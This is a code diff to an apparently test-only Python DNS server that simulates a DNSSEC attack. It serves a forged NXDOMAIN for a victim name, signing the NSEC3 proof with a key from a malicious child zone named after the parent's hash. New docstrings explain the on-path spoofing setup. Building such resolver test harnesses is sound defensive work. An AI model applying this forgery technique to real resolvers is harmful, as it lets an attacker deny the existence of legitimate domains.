@@ -23,9 +23,9 @@ import dns.dnssec
 import dns.flags
 import dns.message
 import dns.name
+import dns.rcode
 import dns.rdata
 import dns.rdataclass
-import dns.rcode
 import dns.rdatatype
 import dns.rrset
 
@@ -141,31 +141,6 @@ def answer_ns(
     add_signed(response.answer, ns_rrset(zone, ns_target), zone_key)
 
 
-def answer_ds(
-    response: dns.message.Message, zone: str, child_key: Key, parent_key: Key
-) -> None:
-    add_signed(response.answer, ds_rrset(zone, child_key), parent_key)
-
-
-def child_nsec3_rrset() -> dns.rrset.RRset:
-    rdata = dns.rdata.from_text(
-        dns.rdataclass.IN,
-        dns.rdatatype.NSEC3,
-        f"1 0 0 - {APEX_HASH} NS SOA RRSIG DNSKEY NSEC3PARAM",
-    )
-    return dns.rrset.from_rdata(name(f"{APEX_HASH}.{TLD}"), TTL, rdata)
-
-
-def forged_nxdomain(response: dns.message.Message, keys: dict[str, Key]) -> None:
-    response.set_rcode(dns.rcode.NXDOMAIN)
-
-    add_signed(response.authority, soa_rrset(TLD), keys[TLD])
-
-    # The owner name derives zone "tld.test.", but the RRSIG signer is the
-    # secure child zone "1b40241kforiog780n4ikscrlvetpctq.tld.test.".
-    add_signed(response.authority, child_nsec3_rrset(), keys[ATTACKER])
-
-
 class SignedResponseHandler(ResponseHandler):
     def __init__(self, keys: dict[str, Key]) -> None:
         self.keys = keys
@@ -183,7 +158,30 @@ class SignedResponseHandler(ResponseHandler):
         raise NotImplementedError
 
 
+def child_nsec3_rrset() -> dns.rrset.RRset:
+    rdata = dns.rdata.from_text(
+        dns.rdataclass.IN,
+        dns.rdatatype.NSEC3,
+        f"1 0 0 - {APEX_HASH} NS SOA RRSIG DNSKEY NSEC3PARAM",
+    )
+    return dns.rrset.from_rdata(name(f"{APEX_HASH}.{TLD}"), TTL, rdata)
+
+
+def forged_nxdomain(response: dns.message.Message, keys: dict[str, Key]) -> None:
+    response.set_rcode(dns.rcode.NXDOMAIN)
+
+    add_signed(response.authority, soa_rrset(TLD), keys[TLD])
+
+    # The owner name derives zone "tld.test.", but the RRSIG signer is the
+    # malicious child zone "1b40241kforiog780n4ikscrlvetpctq.tld.test.".
+    add_signed(response.authority, child_nsec3_rrset(), keys[ATTACKER])
+
+
 class VictimForgedNxdomainHandler(SignedResponseHandler):
+    """
+    This serves the forged response for the victim's domain.
+    """
+
     def match(self, qctx: QueryContext) -> bool:
         return qctx.qname == name(VICTIM) and qctx.qtype == dns.rdatatype.A
 
@@ -192,14 +190,31 @@ class VictimForgedNxdomainHandler(SignedResponseHandler):
 
 
 class ChildDsHandler(SignedResponseHandler):
+    """
+    This will spoof the response for the malicious zone when qtype is DS.
+    It is actually a validly signed DS response.
+    """
+
     def match(self, qctx: QueryContext) -> bool:
         return qctx.qname == name(ATTACKER) and qctx.qtype == dns.rdatatype.DS
 
     def respond(self, qctx: QueryContext) -> None:
-        answer_ds(qctx.response, ATTACKER, self.keys[ATTACKER], self.keys[TLD])
+        response = qctx.response
+        zone = ATTACKER
+        child_key = self.keys[ATTACKER]
+        parent_key = self.keys[TLD]
+
+        add_signed(response.answer, ds_rrset(zone, child_key), parent_key)
 
 
 class AttackerZoneHandler(SignedResponseHandler):
+    """
+    Acts as the malicious authoritative name server. The zone being served
+    is the hashed label of the parent zone (tld.test). This will respond
+    for all queries qtype SOA, DNSKEY, NS at the apex. Any names below
+    the apex are answered with an NXDOMAIN with no NSEC or NSEC3 present.
+    """
+
     def match(self, qctx: QueryContext) -> bool:
         return qctx.qname.is_subdomain(name(ATTACKER))
 
@@ -210,7 +225,9 @@ class AttackerZoneHandler(SignedResponseHandler):
             elif qctx.qtype == dns.rdatatype.SOA:
                 answer_soa(qctx.response, ATTACKER, self.keys[ATTACKER])
             else:
-                answer_ns(qctx.response, ATTACKER, f"ns.{ATTACKER}", self.keys[ATTACKER])
+                answer_ns(
+                    qctx.response, ATTACKER, f"ns.{ATTACKER}", self.keys[ATTACKER]
+                )
                 qctx.response.additional.append(glue_rrset(f"ns.{ATTACKER}", AUTH_IP))
             return
 
@@ -219,6 +236,16 @@ class AttackerZoneHandler(SignedResponseHandler):
 
 
 class TldZoneHandler(SignedResponseHandler):
+    """
+    Acts as the TLD who is being used in the attack, but is not a standard
+    name server. It only responds with validly signed records for DNSKEY, SOA
+    and NS on the apex. Any names below the apex are answered with an NXDOMAIN
+    with no NSEC or NSEC3 present.
+
+    If we turn this into a regular name server than the attack won't work.
+    The attack assumes that the adversary can inject these responses on-path.
+    """
+
     def match(self, qctx: QueryContext) -> bool:
         return qctx.qname.is_subdomain(name(TLD))
 
@@ -247,3 +274,7 @@ def main() -> None:
         TldZoneHandler(keys),
     )
     server.run()
+
+
+if __name__ == "__main__":
+    main()
